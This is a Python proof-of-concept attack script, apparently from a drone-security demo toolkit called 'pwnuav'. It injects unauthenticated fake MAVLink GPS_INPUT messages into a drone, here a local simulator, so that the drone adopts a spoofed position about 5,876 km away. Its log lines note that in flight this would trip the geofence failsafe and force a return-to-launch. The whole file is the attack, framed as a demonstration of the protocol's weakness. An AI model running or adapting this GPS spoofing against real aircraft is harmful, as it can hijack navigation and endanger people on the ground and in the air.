#!/usr/bin/env python3
"""PoC 04 - GPS Spoofing (Terminal 2 — attacker).

Requires the drone running in Terminal 1 (`python attacks/demos/drone.py`).
Injects a fake GPS_INPUT: in Terminal 1 the ASCII drone and its mini-map JUMP
~5,876 km to Medellin. Local version: attacks/04-gps-spoof/gps_spoof_local.py
"""
import argparse
import os
os.environ.setdefault("MAVLINK20", "1")
from pwnuav.gps_spoof import spoof_position
from pwnuav.tui import ClientLink, Activity, hw_check, Steps, run_dashboard

LATf, LONf, ALTf = 6.2518, -75.5636, 1500.0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--seconds", type=float, default=None)
    a = ap.parse_args()

    link = ClientLink(a.connect); act = Activity(); hw = hw_check()
    act.log("hardware checked — GPS_INPUT injection")

    def s1(): act.log("[NV] baseline: San Francisco (37.7749, -122.4194)")
    def s2(): act.log(f"[NV-01] TX fake GPS_INPUT -> {LATf}, {LONf} (fix=3D sats=12)")
    def inj(): spoof_position(link.m, LATf, LONf, ALTf)
    def s3():
        g = link.last.get("GLOBAL_POSITION_INT")
        if g and abs(g.lat / 1e7 - LATf) < 0.01:
            act.log("[IM-03] POSITION ADOPTED — the drone thinks it is ~5,876 km away")
    def s4(): act.log("[IM-02] in flight this trips the GPS/geofence failsafe -> RTL")
    def s5(): act.log("[+] POSITION HIJACKED with a single unauthenticated GPS_INPUT")

    steps = Steps([(0.6, s1), (1.3, s2), (1.5, inj), (1.9, inj), (2.3, inj),
                   (2.7, inj), (3.1, s3), (3.9, s4), (4.5, s5)])
    run_dashboard("PoC 04 — GPS Spoofing", hw, link, act, steps,
                  total=a.seconds, plain=a.plain)
    link.close()


if __name__ == "__main__":
    main()
